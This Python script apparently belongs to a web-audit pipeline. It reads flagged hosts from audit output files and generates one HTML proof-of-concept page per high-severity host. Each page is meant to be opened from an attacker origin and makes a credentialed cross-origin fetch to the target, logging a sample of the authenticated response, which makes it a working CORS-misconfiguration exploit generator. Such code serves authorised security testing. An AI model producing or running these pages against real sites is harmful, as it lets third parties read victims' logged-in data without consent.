#!/usr/bin/env python3
# scripts/generate_pocs.py
"""
Generate HTML PoCs for HIGH verdicts in out/decision.csv.
"""
import csv, json
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
OUT = BASE_DIR / "out"
POC_DIR = BASE_DIR / "pocs"
POC_DIR.mkdir(parents=True, exist_ok=True)

decision_file = OUT / "decision.csv"
findings_file = OUT / "findings.json"

if not decision_file.exists() or not findings_file.exists():
    raise SystemExit("[!] run recon_probe.py and audit_finalize.py first")

decisions = []
with open(decision_file, newline='', encoding='utf-8') as f:
    for row in csv.DictReader(f):
        decisions.append(row)

findings = json.loads(findings_file.read_text(encoding='utf-8'))
find_map = {h["host"]: h for h in findings}

for d in decisions:
    if d["verdict"] != "HIGH":
        continue
    host = d["host"]
    entry = find_map.get(host, {})
    path = "/"
    flag_desc = d.get("rationale","")
    # prefer first flagged path if available
    for p in entry.get("probes", []):
        if p.get("flags"):
            path = p.get("path", "/")
            break
    url = f"https://{host}{path}"
    name = host.replace(".", "_")
    html = f"""<!doctype html>
<html>
<head><meta charset="utf-8"><title>PoC {host}</title></head>
<body>
  <h2>PoC for {host}</h2>
  <p>Flagged: {flag_desc}</p>
  <p>Target: {url}</p>
  <p>Open on attacker origin (ATTACKER_ORIGIN). Check console for output.</p>
  <script>
    (function(){{
      console.log("Running PoC to {url}");
      fetch("{url}", {{method: "GET", credentials: "include", mode: "cors"}})
        .then(r => r.text())
        .then(t => {{
           console.log("LENGTH:", t.length);
           console.log("SAMPLE:", t.slice(0,2000));
           alert("PoC done — check console");
        }}).catch(e => {{
           console.error("ERR", e);
           alert("Fetch error: " + e);
        }});
    }})();
  </script>
</body>
</html>
"""
    (POC_DIR / f"poc_{name}.html").write_text(html, encoding="utf-8")

print(f"[+] Wrote PoCs to {POC_DIR}") 
